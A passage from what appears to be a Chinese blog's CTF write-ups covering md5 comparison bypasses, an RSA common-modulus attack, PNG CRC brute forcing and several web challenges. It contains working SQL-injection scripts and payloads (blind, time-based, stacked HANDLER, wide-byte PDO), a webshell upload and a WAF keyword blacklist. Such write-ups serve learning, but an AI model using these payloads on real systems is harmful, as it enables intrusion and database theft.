class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure><p>然后需要利用<code>md5强比较</code>绕过对<code>val3</code>和<code>val4</code>的判断，由于没有要求是字符串，因此利用数据进行绕过：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">val3[]=<span class="number">1</span>&amp;val4[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>再往下看，对<code>val5</code>、<code>val6</code>和<code>val7</code>进行了<code>(string)</code>的限制，这里的判断是真正需要进行<code>md5碰撞</code>了，网上能找到很多数据有微小差别但是md5值相同的例子，但是都是两个一对的，但是本题有三个变量，需要借助<a href="https://github.com/thereal1024/python-md5-collision">这个工具</a>来生成值不同但是md5相同的文件。</p><p>然后是对<code>a</code>、<code>b</code>、<code>m</code>和<code>n</code>的判断：<br><code>ctype_alnum($a\b)</code>判断<code>a\b</code>是否是字母和数字或字母数字的组合；<br>同时要求<code>m</code>和<code>n</code>长度不能超过<code>1</code>。</p><p>然后令<code>$val8 = md5($a)</code>，<code>$val9 = strtr(md5($b), $m, $n)</code>将<code>md($b)</code>中与<code>$m</code>相同的值替换为<code>$n</code>的值。<br>最后还需要满足<code>($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)</code>，这个地方利用<code>md5</code>弱碰撞就行，利用<code>QNKCDZO/0e830400451993494058024219903391</code>类的字符串，找一个长度为<code>5</code>且md5值以<code>0e</code>开头后面全是数字的字符串<code>$a</code>，另找一个<code>0e</code>开头后面为纯数字/一位字母的字符串<code>$b</code>，若<code>0e</code>后面是一个字母和其他的数字，利用<code>strtr()</code>函数将其md5值中字母改为数字即可。</p><p>难点就在于找满足要求的<code>$a</code>和<code>$b</code>的值了，这里参考getfly师傅的脚本来爆破：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 爆破数字+字母，找到符合md5后为0e开头，且后面为纯数字/一位字母的字符串</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line"></span><br><span class="line">time = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> itertools.permutations(dic, <span class="number">5</span>):</span><br><span class="line">    print(<span class="string">'trying'</span>, time)</span><br><span class="line">    time += <span class="number">1</span></span><br><span class="line">    i = <span class="string">''</span>.join(n)</span><br><span class="line">    li = [<span class="number">0</span>] * <span class="number">26</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    strs = hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> strs[:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> ord(j) &gt;= <span class="number">97</span>:</span><br><span class="line">                li[ord(j)<span class="number">-97</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> li:</span><br><span class="line">            <span class="keyword">if</span> k != <span class="number">0</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count &lt; <span class="number">1</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后利用构造好的payload写脚本拿flag。</p><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://183.129.189.60:10004/?val1=QNKCDZO&amp;val2=s878926199a&amp;val3[]=1&amp;val4[]=2&amp;m=a&amp;n=1'</span></span><br><span class="line"></span><br><span class="line">file1 = open(<span class="string">'out_test_000.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">file2 = open(<span class="string">'out_test_001.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">file3 = open(<span class="string">'out_test_002.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'val5'</span>:file1, <span class="string">'val6'</span>:file2, <span class="string">'val7'</span>:file3, <span class="string">'a'</span>:<span class="string">'byGcY'</span>, <span class="string">'b'</span>:<span class="string">'aOtm2'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = requests.post(url, data)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><h2 id="Crypto-古典密码"><a href="#Crypto-古典密码" class="headerlink" title="Crypto-古典密码"></a>Crypto-古典密码</h2><p>进入题目，分别给了一组<code>凯撒密码</code>加密的字符串、一组<code>morse码</code>、一组<code>栅栏密码</code>加密的字符串，分别解密即可。</p><h2 id="Crypto-RSA"><a href="#Crypto-RSA" class="headerlink" title="Crypto-RSA"></a>Crypto-RSA</h2><p>跟前两天Ichunqiu的抗疫赛中的一道RSA题一样，考察共模攻击</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>附件代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line"><span class="keyword">print</span> c,e,n</span><br><span class="line"></span><br><span class="line">e=<span class="number">11187289</span></span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line"><span class="keyword">print</span> c,e,n</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353 65537 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line"><span class="string">3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710 11187289 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>明显地看出是使用相同的模数<code>n</code>、两个不同的<code>e</code>生成了两个密文<code>c</code>，直接上POC：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">11187289</span></span><br><span class="line">c1 = <span class="number">3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353</span></span><br><span class="line">c2 = <span class="number">3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure><h2 id="Misc-lemonEssence"><a href="#Misc-lemonEssence" class="headerlink" title="Misc-lemonEssence"></a>Misc-lemonEssence</h2><p>考察CRC爆破</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>下载压缩包解压出如下一张<code>PNG</code>图片：<br><img src="http://www.ggb0n.cool/images/anheng2.png" alt=""><br>缩略图可以看，但是放大之后看不了，猜测是对其高或宽进行了更改，需要进行<code>CRC爆破</code>以获得原来的宽和高，修改回去就行了。<br>利用Winrar拿到其CRC，然后利用下面的脚本爆破：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc32key = <span class="number">0x986B9E93</span></span><br><span class="line">data = bytearray(<span class="string">b'\x49\x48\x44\x52\x00\x00\x01\x69\x00\x00\x01\x25\x08\x02\x00\x00\x00'</span>) <span class="comment">#表示宽和高部分的字节(13-29bytes)</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = bytearray(struct.pack(<span class="string">'&gt;i'</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">        height = bytearray(struct.pack(<span class="string">'&gt;i'</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>把爆破出地结果与图片数据对比，发现高的部分被更改了，如图更改回去即可看到flag：<br><img src="http://www.ggb0n.cool/images/anheng3.png" alt=""><br><img src="http://www.ggb0n.cool/images/anheng1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;抗疫抗疫！来自安全人员的行动！
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="比赛划水" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="RSA攻击" scheme="http://ggb0n.cool/tags/RSA%E6%94%BB%E5%87%BB/"/>
    
      <category term="RSA共模攻击" scheme="http://ggb0n.cool/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    
      <category term="md5碰撞" scheme="http://ggb0n.cool/tags/md5%E7%A2%B0%E6%92%9E/"/>
    
      <category term="md5弱比较" scheme="http://ggb0n.cool/tags/md5%E5%BC%B1%E6%AF%94%E8%BE%83/"/>
    
      <category term="md5强比较" scheme="http://ggb0n.cool/tags/md5%E5%BC%BA%E6%AF%94%E8%BE%83/"/>
    
      <category term="CRC32爆破" scheme="http://ggb0n.cool/tags/CRC32%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ichunqiu新春战疫赛-WriteUp</title>
    <link href="http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"/>
    <id>http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/</id>
    <published>2020-02-21T14:14:19.000Z</published>
    <updated>2020-04-22T00:14:53.402Z</updated>
    
    <content type="html"><![CDATA[<p>最近的几个公益赛确实办的不错，安全人员也都是很热爱祖国的♥，中国加油😠 武汉加油😠 大家加油😠<a id="more"></a></p><h2 id="Web-简单的招聘系统"><a href="#Web-简单的招聘系统" class="headerlink" title="Web-简单的招聘系统"></a>Web-简单的招聘系统</h2><p>考察SQL注入</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>测试发现登录的<code>username</code>处存在注入，万能密码就能登录<br><img src="http://www.ggb0n.cool/images/ichunqiu0.png" alt=""><br>这个地方存在注入点，可以利用盲注爆库，这里利用的思路就是通过判断用户名的条件为<code>true</code>登录进行注入，当然还需要一个现有的用户来登录，那么我们注册个用户就行了，参考如下的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select database()),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload = "2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line">payload = <span class="string">"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,&#123;0&#125;)))!='&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># backup flag  user           flag: id  flaaag</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-&#123;&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"lname"</span>: payload.format(i, database + n),</span><br><span class="line">            <span class="string">"lpass"</span>: <span class="string">"xxx"</span></span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url, data=data)</span><br><span class="line">        req.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="comment"># print(req.encoding)</span></span><br><span class="line">        print(data[<span class="string">"lname"</span>])</span><br><span class="line">        <span class="comment"># print(req.text.encode('gbk').decode(req.apparent_encoding))</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"成功"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text.encode(<span class="string">'gbk'</span>).decode(req.apparent_encoding):</span><br><span class="line">            print(<span class="string">"*                      "</span> + n)</span><br><span class="line">            database += n</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Web-ezupload"><a href="#Web-ezupload" class="headerlink" title="Web-ezupload"></a>Web-ezupload</h2><p>文件上传题</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>本以为是一道拐弯的上传题，结果直接传上马了…<br>蚁剑连上，<code>flag</code>文件是空的，但是下面有个<code>/readflag</code>文件，开中断运行这个程序就能拿到flag。<br><img src="http://www.ggb0n.cool/images/ichunqiu2.png" alt=""><br><img src="http://www.ggb0n.cool/images/ichunqiu3.png" alt=""></p><h2 id="Web-盲注"><a href="#Web-盲注" class="headerlink" title="Web-盲注"></a>Web-盲注</h2><p>利用正则进行时间盲注</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>题目已经说的很明显了，需要进行盲注，但是有waf，过滤了很多常用的注入语句，但是<code>REGEXP</code>并没有被ban，那么利用这个函数很简单地就能拿到flag。<br><code>REGEXP</code>：在列值内进行匹配，如果被匹配的文本在列值中出现，<code>REGEXP</code>将会找到它，相应的行将被返回，<code>REGEXP</code>能匹配整个列值。并且<code>REGEXP</code>检查总是返回<code>0（没有匹配）</code>或<code>1（匹配）</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            payload = <span class="string">'1 and if((fl4g    REGEXP "^&#123;0&#125;"),sleep(3),5);'</span></span><br><span class="line">            payload = payload.format(flag+n)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            req = requests.get(url+payload)</span><br><span class="line">            <span class="comment">#print(req.text)</span></span><br><span class="line">            <span class="keyword">if</span> (time.time() - start_time)&gt;<span class="number">2</span>:</span><br><span class="line">                print(flag)</span><br><span class="line">                flag += n</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Web-blacklist"><a href="#Web-blacklist" class="headerlink" title="Web-blacklist"></a>Web-blacklist</h2><p>本题是[强网杯]随便注的改版，考察堆叠注入，这题get到注入新姿势，利用<code>mysql</code>数据库中<code>HANDLER</code>绕过黑名单拿flag。</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>进入题目发现跟强网杯一样的输入框，首先就想到了堆叠注入，测试一下：<br><img src="http://www.ggb0n.cool/images/ichunqiu4.png" alt=""><br>可以看到，语法成功执行了。<br>但是再去测试其他关键字的时候发现很多关键字被ban了：<br><img src="http://www.ggb0n.cool/images/ichunqiu5.png" alt=""><br>本想着利用强网杯的方法，通过改表名来拿flag的，但是<code>rename</code>也被ban了，结合<code>select</code>又被ban，常规的姿势怕是不行，后来借用<code>handler</code>才拿到flag，payload如下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ichunqiu6.png" alt=""><br>关于<code>handler</code>可以参考<a href="https://www.jb51.net/article/88732.htm">这里</a>。</p><h2 id="Web-easysqli-copy"><a href="#Web-easysqli-copy" class="headerlink" title="Web-easysqli_copy"></a>Web-easysqli_copy</h2><p>还是考察PDO、check()函数的绕过、实际盲注，不过这题也get到了新姿势：利用<code>预处理语句</code>进行堆叠注入，这也是采用了PDO之后注入的新趋势了。<br>扩展一下知识：</p><blockquote><p>在php中，<code>PDO</code>有两种模式：<code>模拟预编译</code>与<code>非模拟预编译</code>。默认为模拟预编译模式，即不是真正的预编译，而是采用<code>PDO::quote()</code>函数，首先将用户输入转化为字符型，之后将引号等敏感字符转义。这样在<code>gbk</code>编码下，即可通过宽字节注入绕过防护。<br>但是绕过PDO之后，依然很难绕过<code>check()</code>函数，于是此处利用到了PDO的第二个默认特性：支持<code>多句执行</code>，即可进行堆叠注入。</p></blockquote><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目给出了源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query(<span class="string">"select balabala from table1"</span>);</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query(<span class="string">"set names gbk"</span>);</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(<span class="number">1</span>,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过源码发现，这里利用了<a href="https://www.runoob.com/php/pdo-query.html">PDO</a>接口进行与数据库的链接，其中<code>prepare</code>就是准备了一个预处理语句，<code>$row-&gt;bindParam(1,$id);</code>中的<a href="https://www.runoob.com/php/pdostatement-bindparam.html">binParam</a>作用是绑定一个参数到指定的变量名。<br>请教别的师傅了解到PDO中单引号可能是被自动过滤的，那就只好利用宽字节绕过：<code>%df%27</code>，源码里利用了预处理语句，注入的时候也就选择了利用预处理语句进行注入，同时结合16进制编码绕过对关键字的过滤。</p><h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;'</span></span><br><span class="line">    payloads = <span class="string">"set @a=0x&#123;0&#125;;prepare ctftest from @a; execute ctftest;"</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    letter = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;-'</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line">        print(<span class="string">"前&#123;0&#125;位"</span>.format(m))</span><br><span class="line">        payload = <span class="string">"select if (ascii(mid((select fllllll4g from table1 ),&#123;0&#125;,1))=&#123;1&#125;, sleep(3), 1)"</span>  <span class="comment"># 由于我们会转换为十六进制，所以不存在任何过滤，关键词随便使用</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="comment"># print(payload.format(m, n))</span></span><br><span class="line">            xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n))))</span><br><span class="line">            <span class="comment"># print(xxx)</span></span><br><span class="line">            times = time.time()</span><br><span class="line">            res = requests.post(xxx)</span><br><span class="line">            <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:</span><br><span class="line">                flag += n</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])  <span class="comment"># 字符串转换为16进制的函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="Web-Easqli"><a href="#Web-Easqli" class="headerlink" title="Web-Easqli"></a>Web-Easqli</h2><p>考察盲注，这题也学到了新姿势：在<code>union select</code>被ban的情况下，进行<code>多列</code>数据的爆破。</p><h3 id="题目分析-1"><a 